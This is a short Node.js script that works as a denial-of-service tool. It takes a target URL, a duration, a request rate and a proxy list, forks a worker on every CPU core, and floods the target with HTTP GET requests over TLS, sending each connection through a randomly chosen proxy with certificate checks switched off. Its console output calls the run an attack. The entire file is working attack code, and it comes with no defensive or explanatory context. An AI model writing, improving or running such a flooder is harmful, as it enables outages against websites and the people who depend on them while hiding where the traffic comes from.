const cluster = require('cluster');
const fs = require('fs');
const tls = require('tls');
const { URL } = require('url');
const os = require('os');

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const rps = parseInt(process.argv[4], 10);
const proxyFile = process.argv[5];

if (!targetURL || !duration || !rps || !proxyFile) {
    console.error("Usage: node script.js <url> <time> <rps> <proxy.txt>");
    process.exit(1);
}

const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());

if (cluster.isMaster) {
    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${os.cpus().length} cores`);

    for (let i = 0; i < os.cpus().length; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log("Attack completed.");
        process.exit(0);
    }, duration * 1000);
} else {
    const target = new URL(targetURL);
    
    function sendTLSRequest(proxy) {
        const [proxyHost, proxyPort] = proxy.split(":");

        const options = {
            host: proxyHost,
            port: proxyPort || 8080,
            servername: target.hostname,
            rejectUnauthorized: false
        };

        const client = tls.connect(options, () => {
            for (let i = 0; i < rps; i++) {
                const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                                `Host: ${target.hostname}\r\n` +
                                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
                                "Accept: */*\r\n" +
                                "Connection: keep-alive\r\n\r\n";
                client.write(request);
            }
        });

        client.on("error", () => {
            client.destroy();
        });

        client.on("close", () => {
            client.destroy();
        });
    }

    setInterval(() => {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        sendTLSRequest(proxy);
    }, 1000);
}
